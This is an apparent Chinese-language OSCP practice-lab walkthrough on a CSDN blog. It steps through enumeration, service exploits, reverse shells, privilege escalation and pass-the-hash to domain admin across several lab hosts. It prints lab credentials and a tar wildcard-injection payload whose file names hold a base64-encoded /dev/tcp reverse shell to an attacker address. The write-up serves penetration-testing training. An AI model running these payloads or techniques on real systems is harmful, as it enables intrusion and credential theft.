@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+      <html lang="zh-CN">
+      <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        <link rel="stylesheet" type="text/css" href="https://csdnimg.cn/release/blogv2/dist/pc/css/detail_enter-2fe393ff58.min.css">
+        <link rel="stylesheet" type="text/css" href="https://csdnimg.cn/public/sandalstrap/1.4/css/sandalstrap.min.css">
+        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/kdoc_html_views-1a98987dfd.css">
+        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/ck_htmledit_views-704d5b9767.css">
+        <style>
+          body {
+            max-width: 960px;
+            margin: 0 auto;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+          }
+          img {
+            max-width: 100%;
+            height: auto;
+          }
+          pre {
+            background-color: #e4dfdf;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+          }
+          code {
+            font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+          }
+          blockquote {
+            background: #f9f9f9;
+            border-left: 10px solid #ccc;
+            margin: 1.5em 10px;
+            padding: 0.5em 10px;
+          }
+          table {
+            border-collapse: collapse;
+            width: 100%;
+          }
+          th, td {
+            border: 1px solid #ddd;
+            padding: 8px;
+          }
+          th {
+            background-color: #f2f2f2;
+          }
+        </style>
+      </head>
+      <body>
+          <div class="blog-content-box">
+            <div id="article_content" class="article_content clearfix">
+              <div id="content_views" class="htmledit_views">
+                
+                <!-- https://blog.csdn.net/miuzzx/article/details/136455592  Challenge 6 - OSCP C_chaopen6-CSDN博客 --> 
+
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <p><em><strong>因为oscp考试中限制了Metasploit的使用，所以后面解题的过程也尽量不使用，不过可以使用msfvenom生成shell，以及使用exploit/multi/handler来监听，只是不能用meterpreter。具体细节可以参考一下两篇官方文档<br> <code>https://help.offsec.com/hc/en-us/articles/4547917816468-OffSec-OSCP-Exam-with-AD-Preparation</code><br> <code>https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide</code></strong></em></p> 
+<h2><a id="_3"></a>汇总</h2> 
+<p><strong>域：OSCP.EXAM</strong></p> 
+<table><thead><tr><th>IP</th><th>HOSTNAME</th><th>Ports</th></tr></thead><tbody><tr><td>10.10.x.152</td><td>dc01</td><td>53,135,139,445,593,636</td></tr><tr><td>192.168.x.153</td><td>ms01</td><td>22,135,139,445,5985,8000,20221</td></tr><tr><td>10.10.x.x.154</td><td>ms02</td><td>135,139,445,1433</td></tr><tr><td>192.168.x.155</td><td>pascha</td><td>80,9099,9999</td></tr><tr><td>192.168.x.156</td><td>frankfurt</td><td>21,22,25,53,80,110,143,465,587,993,995,2525,3306,8080,8083,8443 UDP116</td></tr><tr><td>192.168.x.157</td><td>charlie</td><td>21,22,80,20000</td></tr></tbody></table> 
+<h2><a id="155_15"></a>155</h2> 
+<pre><code>PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows
+
+9099/tcp open  unknown
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest: 
+|     HTTP/1.0 200 OK 
+|     Server: Mobile Mouse Server 
+|     Content-Type: text/html 
+|     Content-Length: 321
+|_    &lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Success!&lt;/TITLE&gt;&lt;meta name="viewport" content="width=device-width,user-scalable=no" /&gt;&lt;/HEAD&gt;&lt;BODY BGCOLOR=#000000&gt;&lt;br&gt;&lt;br&gt;&lt;p style="font:12pt arial,geneva,sans-serif; text-align:center; color:green; font-weight:bold;" &gt;The server running on "OSCP" was able to receive your request.&lt;/p&gt;&lt;/BODY&gt;&lt;/HTML&gt;
+
+9999/tcp open  abyss?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9099-TCP:V=7.94SVN%I=7%D=2/27%Time=65DD9BC2%P=x86_64-pc-linux-gnu%r
+SF:(GetRequest,1A2,"HTTP/1\.0\x20200\x20OK\x20\r\nServer:\x20Mobile\x20Mou
+SF:se\x20Server\x20\r\nContent-Type:\x20text/html\x20\r\nContent-Length:\x
+SF:20321\r\n\r\n&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Success!&lt;/TITLE&gt;&lt;meta\x20name=\"viewpor
+SF:t\"\x20content=\"width=device-width,user-scalable=no\"\x20/&gt;&lt;/HEAD&gt;&lt;BOD
+SF:Y\x20BGCOLOR=#000000&gt;&lt;br&gt;&lt;br&gt;&lt;p\x20style=\"font:12pt\x20arial,geneva,sa
+SF:ns-serif;\x20text-align:center;\x20color:green;\x20font-weight:bold;\"\
+SF:x20&gt;The\x20server\x20running\x20on\x20\"OSCP\"\x20was\x20able\x20to\x20
+SF:receive\x20your\x20request\.&lt;/p&gt;&lt;/BODY&gt;&lt;/HTML&gt;\r\n")%r(FourOhFourReques
+SF:t,1A2,"HTTP/1\.0\x20200\x20OK\x20\r\nServer:\x20Mobile\x20Mouse\x20Serv
+SF:er\x20\r\nContent-Type:\x20text/html\x20\r\nContent-Length:\x20321\r\n\
+SF:r\n&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Success!&lt;/TITLE&gt;&lt;meta\x20name=\"viewport\"\x20con
+SF:tent=\"width=device-width,user-scalable=no\"\x20/&gt;&lt;/HEAD&gt;&lt;BODY\x20BGCOL
+SF:OR=#000000&gt;&lt;br&gt;&lt;br&gt;&lt;p\x20style=\"font:12pt\x20arial,geneva,sans-serif;\
+SF:x20text-align:center;\x20color:green;\x20font-weight:bold;\"\x20&gt;The\x2
+SF:0server\x20running\x20on\x20\"OSCP\"\x20was\x20able\x20to\x20receive\x2
+SF:0your\x20request\.&lt;/p&gt;&lt;/BODY&gt;&lt;/HTML&gt;\r\n");
+</code></pre> 
+<p>开放了<code>80 9099 9999</code><br> 其中9099端口是mobile mouse服务。<br> 直接searchexploit 可以发现利用脚本，用脚本进行反弹。<br> 然后上winPEASx64.exe，发现一个可疑进程。没准可以替换。<br> <img src="http://apic.todo6.com/app/operate/csdn/proxy?url=https%3A%2F%2Fi-blog.csdnimg.cn%2Fblog_migrate%2F6e552ded8b86c0f1a41d953d8b50ea6d.png" alt="在这里插入图片描述"><br> 并且我们有重启的权限<br> <code>Restart-Service GPGOrchestrator</code></p> 
+<p>生成木马shell.exe替换掉这个程序然后重启服务就可以得到提权了。</p> 
+<h2><a id="156_63"></a>156</h2> 
+<p>开放了161端口，直接snmpbulkwalk扫描</p> 
+<pre><code>snmpbulkwalk -c public -v2c  192.168.243.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
+</code></pre> 
+<p>得到账号密码<code>jack:3PUKsX98BMupBiCf</code><br> 试了那几个web端口，发现可以登录8083的vesta，但是需要用户名大写<code>Jack</code><br> 接着登录之后里面可以创建计划任务，直接弄个反弹shell，一分钟回弹。<br> 得到shell后，运行linpeas.sh<br> <img src="http://apic.todo6.com/app/operate/csdn/proxy?url=https%3A%2F%2Fi-blog.csdnimg.cn%2Fblog_migrate%2Fd3958c35b332a47108e5ee29e4363f08.png" alt="在这里插入图片描述"><br> 提供了几个可能的漏洞，挨个试一下。<br> <code>https://github.com/scheatkode/CVE-2018-18955/releases/download/v0.0.1/linux-x86_64.zip</code><br> 这个可以直接提权</p> 
+<h2><a id="157_76"></a>157</h2> 
+<p>ftp可以直接匿名登录，下载下来这些pdf，在属性里面发现了三个用户名<code>Robert Mark Cassie</code><br> 其中账号密码<code>cassie:cassie</code>可以登录20000端口的usermin。<br> 登录后可以利用usermin的漏洞getshell<br> <code>https://github.com/sergiovks/Usermin-1.820-Exploit-RCE-Authenticated</code><br> <code>linpeas.sh</code>执行完一遍后发现一个特殊的文件<br> <code>/etc/cron.d/2minutes</code><br> 内容为</p> 
+<pre><code>SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+*/2 * * * * root cd /opt/admin &amp;&amp; tar -zxf /tmp/backup.tar.gz *
+</code></pre> 
+<p>网上找了一圈发现这个<code>*</code>存在问题</p> 
+<pre><code>如果攻击者可以控制当前目录，他们可能会创建具有特殊名称的文件，这些文件名可能会触发 tar 命令的特定选项，
+或者在解压缩时触发其他命令的执行（比如通过创建一个名为 --checkpoint-action=exec=sh malicious-script.sh 的文件
+</code></pre> 
+<p>不过还需要一个参数<code>--checkpoint=1</code></p> 
+<pre><code>echo 123 &gt; '--checkpoint=1'
+echo 123 &gt; '--checkpoint-action=exec="echo YmFzaCAtYyAnMDwmNDktO2V4ZWMgNDk8Pi9kZXYvdGNwLzE5Mi4xNjguNDUuMTYxLzQ1NjY7c2ggPCY0OSA+JjQ5IDI+JjQ5Jw==|base64 -d|bash"'
+</code></pre> 
+<p>其中里面的base64为要执行的命令。<br> 这里直接反弹shell就好了</p> 
+<h2><a id="153_102"></a>153</h2> 
+<pre><code>22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
+|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
+|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
+
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+
+8000/tcp open  http          Microsoft IIS httpd 10.0
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: IIS Windows
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+</code></pre> 
+<p>8000端口下扫描可以得到/partner/db<br> 下载下来打开发现<br> <img src="http://apic.todo6.com/app/operate/csdn/proxy?url=https%3A%2F%2Fi-blog.csdnimg.cn%2Fblog_migrate%2Fa274753bcb109584fb4e4610347f1a2a.png" alt="在这里插入图片描述"><br> 破解support的密码为<code>Freedom1</code>(md5)<br> 开放了5985端口，可以用evil-winrm登录。<br> 在support用户目录下存在一个admintool.exe，直接运行会发现</p> 
+<pre><code> right: `"05f8ba9f047f799adbea95a16de2ef5d"`
+</code></pre> 
+<p>解下md5得到December31，ssh登录下administrator。<br> 在<code>C:\Users\administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>发现一个新的密码<code>hghgib6vHT3bVWf</code><br> 可以直接用psexec登录，然后下载 c://windows.old//Windows//System32//SYSTEM和 c://windows.old//Windows//System32//SAM<br> 利用pwdump.py进行破解可以得到tom_admin的hash。利用impacket-psexec直接hash传递就可以了。tom_admin直接就是域管理员了。</p>
+                
+              </div>
+              </div>
+          </div>
+      </body>
+      </html>
